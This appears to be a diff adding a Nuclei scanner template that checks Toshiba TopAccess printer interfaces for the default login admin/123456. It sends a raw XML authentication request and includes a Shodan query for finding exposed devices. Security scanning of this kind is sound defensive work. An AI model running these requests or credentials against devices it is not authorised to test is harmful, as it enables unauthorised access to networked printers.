@@ -1,0 +1,60 @@
+id: topaccess-default-login
+
+info:
+  name: Toshiba TopAccess - Default-Login
+  author: ritikchaddha
+  severity: high
+  reference:
+    - https://business.toshiba.com/downloads/KB/f1Ulds/11646/KH-1020_TAG_EN_0002.pdf
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: title:"topaccess"
+  tags: topaccess,default-login,misconfig
+
+variables:
+  username: "admin"
+  password: "123456"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /contentwebserver HTTP/1.1
+        Host: {{Hostname}}
+        csrfpId: {{csrf_token}}
+        Content-Type: text/plain; charset=UTF-8
+
+        <DeviceInformationModel><GetValue><Authentication><UserCredential></UserCredential></Authentication></GetValue><GetValue><Panel><DiagnosticMode><Mode_08><Code_8913></Code_8913></Mode_08></DiagnosticMode></Panel></GetValue><SetValue><Authentication><UserCredential><userName>{{username}}</userName><passwd>{{password}}</passwd><ipaddress></ipaddress><DepartmentManagement isEnable='false'><requireDepartment></requireDepartment></DepartmentManagement><domainName></domainName><applicationType>TOP_ACCESS</applicationType></UserCredential></Authentication></SetValue><SetValue><UserManager><View><Users><Information><passwd>admin</passwd></Information></Users></View></UserManager></SetValue><Command><Login><commandNode>Authentication/UserCredential</commandNode><Params><appName>TOPACCESS</appName></Params></Login></Command></DeviceInformationModel>
+
+    host-redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<name>Administrator'
+          - 'STATUS_OK</statusOfOperation'
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - text/xml
+
+      - type: status
+        part: header_2
+        status:
+          - 200
+
+    extractors:
+      - type: kval
+        name: csrf_token
+        kval:
+          - 'session'
+        internal: true
+# digest: 4b0a00483046022100c10207eb7928f18653abea7ec4c5f753df085154d1d6572e6ac9fb0d4f0cfefd022100ffbdb3ff8082ea515db85b01767992a8c03c7cd746f8f7059233ddd2cfd220e1:922c64590222798bb761d5b6d8e72950
